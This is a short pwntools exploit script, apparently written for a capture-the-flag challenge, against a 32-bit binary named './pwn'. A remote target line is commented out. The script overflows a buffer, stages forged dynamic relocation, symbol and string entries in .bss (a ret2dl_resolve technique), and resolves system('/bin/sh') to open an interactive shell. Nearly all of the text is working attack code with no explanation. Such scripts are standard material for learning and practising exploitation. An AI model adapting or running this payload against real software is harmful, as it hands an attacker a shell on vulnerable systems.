from pwn import *
context.log_level='debug'
context.arch='i386'
p=process('./pwn')
#p=remote("39.97.227.64",56833)
got=0x804a00c
read=0x8048390
rbp=0x080485db
ppp=0x080485d9
ret=0x080481ab
bss=0x0804a810
plt0=0x8048380
strtab=0x804827c
dynsym=0x80481dc
dynrel=0x804833c#plt
p2=flat(
[got,0x07+(((bss+0x10-dynsym)/0x10)<<8)],bss+0x28-0x804827c,bss+0x28-0x804827c,# DYN_REL & ALAIGN
[bss+0x28-strtab,0x12,0,0,0,0],#DYNSYM
)+"system\x00\x00"+"/bin/sh\x00"#DYNSTR

payload="\00"*0x28+p32(0)+p32(read)+p32(ppp)+p32(0)+p32(bss)+p32(0x597)+p32(plt0)+p32(bss-dynrel)+p32(bss+0x30)*2
p.send(payload)
gdb.attach(p,'')
sleep(1)
p.send(p2)

p.interactive()
